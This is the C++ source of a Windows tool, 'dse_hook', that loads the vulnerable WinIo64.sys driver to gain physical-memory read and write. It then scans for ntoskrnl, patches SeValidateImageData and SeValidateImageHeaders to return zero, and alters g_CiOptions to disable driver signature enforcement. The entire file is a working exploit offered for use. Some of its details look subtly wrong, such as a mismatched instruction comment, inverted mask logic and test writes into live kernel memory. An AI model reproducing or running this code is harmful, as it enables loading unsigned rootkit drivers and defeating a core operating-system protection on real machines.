#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

unsigned char se_validate_image_data_original[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
unsigned char se_validate_image_header_original[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

// SeValidateImageData pattern (dynamic offset placeholder 0x00, 0x00, 0x00, 0x00)
unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };

unsigned char se_validate_image_data_mask[17] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Exact match for these bytes
    0x00, 0x00, 0x00, 0x00,                  // Wildcard (skip comparison)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};


unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

// Corresponding mask for `se_validate_image_header_pattern`
unsigned char se_validate_image_header_mask[21] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Exact match for static bytes
    0xFF, 0xFF, 0xFF, 0xFF,                  // Exact match
    0xFF, 0xFF, 0xFF, 0xFF,                  // Exact match
    0x00, 0x00, 0x00, 0x00,                  // Wildcard (ignore these bytes)
    0xFF, 0xFF                               // Exact match
};

// New pattern for g_CiOptions (mov eax, g_CiOptions)
unsigned char g_cioptions_pattern[6] = { 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00 };

char patch[6] = {
    0xB8, 0x00, 0x00, 0x00, 0x00,    // mov rax, 0
    0xC3                            // ret
};

u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
    u64 size;
    u64 phys_address;
    u64 phys_handle;
    u64 phys_linear;
    u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
    u32 bytes_returned;
    if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
        return NULL;

    return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
    u32 bytes_returned;
    if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
        return false;

    return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
    winio_packet packet;
    packet.phys_address = addr;
    packet.size = size;

    u64 linear_address = phys_map(packet);
    if (linear_address == NULL)
        return false;

    if (IsBadReadPtr((void*)linear_address, 1))
        return false;

    printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
    memcpy((void*)buf, (void*)linear_address, size);

    phys_unmap(packet);
    return true;
}

bool write_phys(u64 addr, u64 buf, u64 size)
{
    winio_packet packet;
    packet.phys_address = addr;
    packet.size = size;

    u64 linear_address = phys_map(packet);
    if (linear_address == NULL)
        return false;

    if (IsBadReadPtr((void*)linear_address, 1))
        return false;

    printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
    memcpy((void*)linear_address, (void*)buf, size);

    // Immediately read back to verify the patch
    u64 verify_buf = 0;
    memcpy(&verify_buf, (void*)linear_address, size);
    if (memcmp(&verify_buf, (void*)buf, size) != 0) {
        printf("[!] Verification failed: written value did not match at pa: 0x%llx\n", addr);
        phys_unmap(packet);
        return false;
    }

    printf("[*] Verified write: 0x%llx successfully written to pa:0x%llx.\n", *(u64*)buf, addr);

    phys_unmap(packet);
    return true;
}


u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
    u64 buf = (u64)malloc(range);
    read_phys(start, (u64)buf, range);

    u64 result = 0;
    for (int i = 0; i < range; i++)
    {
        bool vtn = true;
        for (int j = 0; j < pattern_length; j++)
        {
            if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
            {
                vtn = false;
            }
        }

        if (vtn)
        {
            result = start + i;
            goto ret;
        }
    }

ret:
    free((void*)buf);
    return result;
}

bool file_exists(const std::string path) {
    DWORD v0 = GetFileAttributesA(path.c_str());
    return v0 != -1 && !(v0 & 0x00000010);
}

int test_write_read()
{
    printf("[*] Performing test write and read...\n");

    // Define a test physical address (replace with an actual test address for your system)
    u64 test_phys_addr = 0x100000;  // Example test physical address (modify accordingly)
    u64 test_write_value = 0xDEADBEEFDEADBEEF;  // Test write value
    u64 test_read_value = 0;

    // Write test value to the test physical address
    if (!write_phys(test_phys_addr, (u64)&test_write_value, sizeof(test_write_value))) {
        printf("[!] Failed to write test value to physical address 0x%llx\n", test_phys_addr);
        return -1;
    }
    printf("[*] Test value 0x%llx written to physical address 0x%llx\n", test_write_value, test_phys_addr);

    // Read back the value from the test physical address
    if (!read_phys(test_phys_addr, (u64)&test_read_value, sizeof(test_read_value))) {
        printf("[!] Failed to read test value from physical address 0x%llx\n", test_phys_addr);
        return -1;
    }

    // Check if the read value matches the written value
    if (test_read_value == test_write_value) {
        printf("[*] Read back value 0x%llx matches written value! Write and read test successful.\n", test_read_value);
        return 0;
    }
    else {
        printf("[!] Read back value 0x%llx does NOT match written value 0x%llx. Test failed.\n", test_read_value, test_write_value);
        return -1;
    }
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
    u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
    u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
    sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
    sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
    system((char*)cmdline_create_buf);
    system((char*)cmdline_start_buf);
}

u64 find_g_CiOptions(u64 ntos_base_pa)
{
    printf("[*] Attempting to find g_CiOptions pattern in ntoskrnl...\n");

    // Look for the instruction pattern that references g_CiOptions
    u64 g_cioptions_instr_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, g_cioptions_pattern, sizeof(g_cioptions_pattern));
    if (g_cioptions_instr_pa == 0)
    {
        printf("[!] Pattern not found in the given range.\n");
        return 0;
    }

    printf("[*] Found g_CiOptions reference at physical address: 0x%llx\n", g_cioptions_instr_pa);

    // Now, we need to dereference this address to get the actual g_CiOptions physical address
    u32 offset;
    if (!read_phys(g_cioptions_instr_pa + 2, (u64)&offset, sizeof(offset)))  // +2 to skip the opcode
    {
        printf("[!] Failed to read g_CiOptions offset.\n");
        return 0;
    }

    // Calculate the actual g_CiOptions address
    u64 g_cioptions_pa = g_cioptions_instr_pa + 6 + offset;  // 6 is the size of the mov instruction
    printf("[*] Actual g_CiOptions physical address: 0x%llx\n", g_cioptions_pa);

    return g_cioptions_pa;
}
void print_windbg_verification(u64 pa, u32 value)
{
    printf("[*] WinDbg verification:\n");
    printf("!pte 0x%llx\n", pa);
    printf("db 0x%llx\n", pa);
    printf("Value: 0x%x\n", value);
}

void restore_g_CiOptions(u64 g_cioptions_pa, u32 original_value) {
    printf("[*] Restoring original g_CiOptions value: 0x%x\n", original_value);

    if (!write_phys(g_cioptions_pa, (u64)&original_value, sizeof(original_value))) {
        printf("[!] Failed to restore g_CiOptions.\n");
    }
    else {
        printf("[*] Successfully restored g_CiOptions to original value.\n");
    }
}



u64 find_pattern_with_mask(u64 start, u64 range, unsigned char* pattern, unsigned char* mask, size_t pattern_length) {
    u64 buf = (u64)malloc(range);
    if (buf == NULL || !read_phys(start, buf, range)) {
        printf("[!] Failed to allocate or read memory for pattern search at start: 0x%llx\n", start);
        free((void*)buf);
        return 0;
    }

    u64 result = 0;
    for (int i = 0; i < range - pattern_length; i++) {
        bool found = true;
        for (int j = 0; j < pattern_length; j++) {
            if (mask[j] != 0xFF && pattern[j] != *(unsigned char*)(buf + i + j)) {
                found = false;
                break;
            }
        }

        if (found) {
            result = start + i;
            printf("[*] Pattern found at physical address: 0x%llx\n", result);
            break;
        }
    }

    if (result == 0) {
        printf("[!] Pattern not found within the specified range.\n");
    }

    free((void*)buf);
    return result;
}



u64 find_se_validate_image_data(u64 ntos_base_pa) {
    printf("[*] Attempting to find SeValidateImageData pattern in ntoskrnl...\n");

    u64 se_validate_image_data_pa = find_pattern_with_mask(ntos_base_pa, PATTERN_SEARCH_RANGE, se_validate_image_data_pattern, se_validate_image_data_mask, sizeof(se_validate_image_data_pattern));

    if (se_validate_image_data_pa == 0) {
        printf("[!] Pattern for SeValidateImageData not found.\n");
        return 0;
    }

    printf("[*] Found SeValidateImageData at physical address: 0x%llx\n", se_validate_image_data_pa);
    return se_validate_image_data_pa;
}


u64 find_se_validate_image_header(u64 ntos_base_pa) {
    printf("[*] Attempting to find SeValidateImageHeaders pattern in ntoskrnl...\n");

    u64 se_validate_image_header_pa = find_pattern_with_mask(ntos_base_pa, PATTERN_SEARCH_RANGE, se_validate_image_header_pattern, se_validate_image_header_mask, sizeof(se_validate_image_header_pattern));

    if (se_validate_image_header_pa == 0) {
        printf("[!] Pattern for SeValidateImageHeaders not found.\n");
        return 0;
    }

    printf("[*] Found SeValidateImageHeaders at physical address: 0x%llx\n", se_validate_image_header_pa);
    return se_validate_image_header_pa;
}
bool verify_and_dump_patch(u64 phys_addr, u64 expected_value, size_t size) {
    u64 readback_value = 0;

    // Read back the patched memory
    if (!read_phys(phys_addr, (u64)&readback_value, size)) {
        printf("[!] Failed to read memory at physical address: 0x%llx\n", phys_addr);
        return false;
    }

    // Compare the read-back value with the expected patch
    if (memcmp(&readback_value, &expected_value, size) != 0) {
        printf("[!] Verification failed at pa: 0x%llx. Expected: 0x%llx, but got: 0x%llx\n", phys_addr, expected_value, readback_value);
        return false;
    }

    // Dump the successfully patched value
    printf("[*] Successfully verified patch at pa: 0x%llx. Patched value: 0x%llx\n", phys_addr, readback_value);

    // Dump memory content for more debugging context
    u64 dump_buffer = 0;
    if (read_phys(phys_addr, (u64)&dump_buffer, size)) {
        printf("[*] Memory content after patch at pa: 0x%llx: 0x%llx\n", phys_addr, dump_buffer);
    }
    else {
        printf("[!] Failed to dump memory at pa: 0x%llx\n", phys_addr);
    }

    return true;
}


bool test_patch_write(u64 phys_addr, u64 test_value, u64 final_value, size_t size) {
    u64 original_value = 0;

    // Step 1: Read the original value
    if (!read_phys(phys_addr, (u64)&original_value, size)) {
        printf("[!] Failed to read original memory at physical address: 0x%llx\n", phys_addr);
        return false;
    }
    printf("[*] Original value at pa: 0x%llx: 0x%llx\n", phys_addr, original_value);

    // Step 2: Write the test value (0xDEADBEEF) to the memory
    if (!write_phys(phys_addr, (u64)&test_value, size)) {
        printf("[!] Failed to write test value to pa: 0x%llx\n", phys_addr);
        return false;
    }
    printf("[*] Test value 0x%llx written to pa: 0x%llx\n", test_value, phys_addr);

    // Step 3: Read back and verify the test value
    u64 readback_value = 0;
    if (!read_phys(phys_addr, (u64)&readback_value, size)) {
        printf("[!] Failed to read back memory at physical address: 0x%llx\n", phys_addr);
        return false;
    }

    if (readback_value != test_value) {
        printf("[!] Test write verification failed at pa: 0x%llx. Expected: 0x%llx, but got: 0x%llx\n", phys_addr, test_value, readback_value);
        return false;
    }
    printf("[*] Test write verification succeeded at pa: 0x%llx. Test value: 0x%llx\n", phys_addr, readback_value);

    // Step 4: Write the final patch value (e.g., g_CiOptions = 0x6)
    if (!write_phys(phys_addr, (u64)&final_value, size)) {
        printf("[!] Failed to write final patch value to pa: 0x%llx\n", phys_addr);
        return false;
    }
    printf("[*] Final patch value 0x%llx written to pa: 0x%llx\n", final_value, phys_addr);

    // Step 5: Verify the final patch value
    return verify_and_dump_patch(phys_addr, final_value, size);
}

int main(int argc, char* argv[])
{
    printf("[*] dse_hook by emlinhax\n");

    // Argument validation
    if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
    {
        printf("[!] Usage: dse_hook.exe <your_driver_name> <path_to_your_driver.sys>\n");
        Sleep(1000);
        return -1;
    }

    // Ensure the driver exists
    if (!file_exists(argv[2]))
    {
        printf("[!] Could not find your driver at: %s\n", argv[2]);
        system("pause>NUL");
        return -2;
    }

    // Open the winio handle
LOAD_WINIO:
    printf("[*] Attempting to open handle to WinIO driver...\n");
    driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // Handle missing driver case
    if (driver_handle == -1)
    {
        GetCurrentDirectoryA(FILENAME_MAX, winio_path);
        strcat(winio_path, "\\WinIO64.sys");

        if (!file_exists(winio_path))
        {
            printf("[!] Could not find winio driver. Ensure WinIo64.sys is in the directory.\n");
            system("pause>NUL");
            return -3;
        }

        // Load winio driver
        system("sc stop winio_dse_hook >NUL");
        system("sc delete winio_dse_hook >NUL");
        load_driver_lazy("winio_dse_hook", winio_path);
        goto LOAD_WINIO;
    }

    printf("[*] WinIO driver handle obtained: %p\n", driver_handle);

    // Perform a test write/read operation
    if (test_write_read() != 0)
    {
        printf("[!] Test write/read failed. Aborting.\n");
        return -1;
    }
    printf("[*] Write/read test successful! Proceeding with patching.\n");

    // Find ntoskrnl base address
    printf("[*] Searching for ntoskrnl base in physical memory...\n");
    u64 ntos_base_pa = 0;
    for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
    {
        char* buf = (char*)malloc(2);
        read_phys(i, (u64)buf, 2);

        if (buf[0] == 'M' && buf[1] == 'Z')
        {
            ntos_base_pa = i;
            printf("[*] ntoskrnl found @ physical address: 0x%llx\n", ntos_base_pa);
            break;
        }

        free(buf);
    }

    if (!ntos_base_pa)
    {
        printf("[!] Could not find ntoskrnl base. Exiting...\n");
        system("pause>NUL");
        return -5;
    }

    // Test value (semi-random) - DEADBEEF
    u64 test_value = 0xDEADBEEFDEADBEEF;

    // Locate and patch SeValidateImageData with test value first
    printf("[*] Patching SeValidateImageData with test value...\n");
    u64 se_validate_image_data_pa = find_se_validate_image_data(ntos_base_pa);
    if (se_validate_image_data_pa == 0) return -1;

    // Backup the original SeValidateImageData
    if (!read_phys(se_validate_image_data_pa, (u64)se_validate_image_data_original, sizeof(se_validate_image_data_original))) {
        printf("[!] Failed to backup SeValidateImageData. Aborting.\n");
        return -1;
    }

    // Write the test value to SeValidateImageData and verify
    if (!write_phys(se_validate_image_data_pa, (u64)&test_value, sizeof(test_value))) {
        printf("[!] Failed to write test value to SeValidateImageData. Aborting.\n");
        return -1;
    }
    printf("[*] Test value 0x%llx written to SeValidateImageData.\n", test_value);

    if (!verify_and_dump_patch(se_validate_image_data_pa, test_value, sizeof(test_value))) {
        printf("[!] Verification of test value failed for SeValidateImageData. Aborting.\n");
        return -1;
    }

    // Now patch with actual patch (0xC3 ...)
    printf("[*] Patching SeValidateImageData with actual patch...\n");
    if (!write_phys(se_validate_image_data_pa, (u64)patch, sizeof(patch))) {
        printf("[!] Failed to patch SeValidateImageData. Aborting.\n");
        return -1;
    }
    printf("[*] Successfully patched SeValidateImageData.\n");

    if (!verify_and_dump_patch(se_validate_image_data_pa, *(u64*)patch, sizeof(patch))) {
        printf("[!] Verification failed for SeValidateImageData. Aborting.\n");
        return -1;
    }

    // Locate and patch SeValidateImageHeaders with test value first
    printf("[*] Patching SeValidateImageHeaders with test value...\n");
    u64 se_validate_image_header_pa = find_se_validate_image_header(ntos_base_pa);
    if (se_validate_image_header_pa == 0) return -1;

    // Backup the original SeValidateImageHeader
    if (!read_phys(se_validate_image_header_pa, (u64)se_validate_image_header_original, sizeof(se_validate_image_header_original))) {
        printf("[!] Failed to backup SeValidateImageHeader. Aborting.\n");
        return -1;
    }

    // Write the test value to SeValidateImageHeaders and verify
    if (!write_phys(se_validate_image_header_pa, (u64)&test_value, sizeof(test_value))) {
        printf("[!] Failed to write test value to SeValidateImageHeaders. Aborting.\n");
        return -1;
    }
    printf("[*] Test value 0x%llx written to SeValidateImageHeaders.\n", test_value);

    if (!verify_and_dump_patch(se_validate_image_header_pa, test_value, sizeof(test_value))) {
        printf("[!] Verification of test value failed for SeValidateImageHeaders. Aborting.\n");
        return -1;
    }

    // Now patch with actual patch (0xC3 ...)
    printf("[*] Patching SeValidateImageHeaders with actual patch...\n");
    if (!write_phys(se_validate_image_header_pa, (u64)patch, sizeof(patch))) {
        printf("[!] Failed to patch SeValidateImageHeaders. Aborting.\n");
        return -1;
    }
    printf("[*] Successfully patched SeValidateImageHeaders.\n");

    if (!verify_and_dump_patch(se_validate_image_header_pa, *(u64*)patch, sizeof(patch))) {
        printf("[!] Verification failed for SeValidateImageHeaders. Aborting.\n");
        return -1;
    }

    // Locate and patch g_CiOptions with test value
    printf("[*] Patching g_CiOptions with test value...\n");
    u64 g_cioptions_pa = find_g_CiOptions(ntos_base_pa);
    if (g_cioptions_pa == 0) {
        printf("[!] Failed to locate g_CiOptions. Exiting...\n");
        return -6;
    }

    // Read current g_CiOptions value
    u32 g_cioptions_value = 0;
    if (!read_phys(g_cioptions_pa, (u64)&g_cioptions_value, sizeof(g_cioptions_value))) {
        printf("[!] Failed to read g_CiOptions. Exiting...\n");
        return -7;
    }
    printf("[*] Current g_CiOptions value: 0x%x\n", g_cioptions_value);

    // Backup original g_CiOptions value
    u32 original_g_cioptions_value = g_cioptions_value;
    printf("[*] Backed up original g_CiOptions value: 0x%x\n", original_g_cioptions_value);

    // Print for easy comparison in WinDbg
    print_windbg_verification(g_cioptions_pa, g_cioptions_value);

    // Write the test value to g_CiOptions and verify
    if (!write_phys(g_cioptions_pa, (u64)&test_value, sizeof(test_value))) {
        printf("[!] Failed to write test value to g_CiOptions. Aborting.\n");
        return -1;
    }
    printf("[*] Test value 0x%llx written to g_CiOptions.\n", test_value);

    if (!verify_and_dump_patch(g_cioptions_pa, test_value, sizeof(test_value))) {
        printf("[!] Verification of test value failed for g_CiOptions. Aborting.\n");
        return -1;
    }

    // Now patch g_CiOptions to disable signature checks (e.g., set bit 6)
    printf("[*] Patching g_CiOptions to disable signature checks...\n");
    g_cioptions_value |= 0x6;
    if (!write_phys(g_cioptions_pa, (u64)&g_cioptions_value, sizeof(g_cioptions_value))) {
        printf("[!] Failed to patch g_CiOptions. Exiting...\n");
        return -1;
    }
    printf("[*] Successfully patched g_CiOptions.\n");

    if (!verify_and_dump_patch(g_cioptions_pa, *(u64*)&g_cioptions_value, sizeof(g_cioptions_value))) {
        printf("[!] Verification failed for g_CiOptions. Exiting...\n");
        return -1;
    }

    // Done
    printf("[*] All patches applied and verified successfully. Process complete.\n");
    Sleep(1000);

    // Optionally restore the original g_CiOptions value
    // restore_g_CiOptions(g_cioptions_pa, original_g_cioptions_value);

    return 0;
}

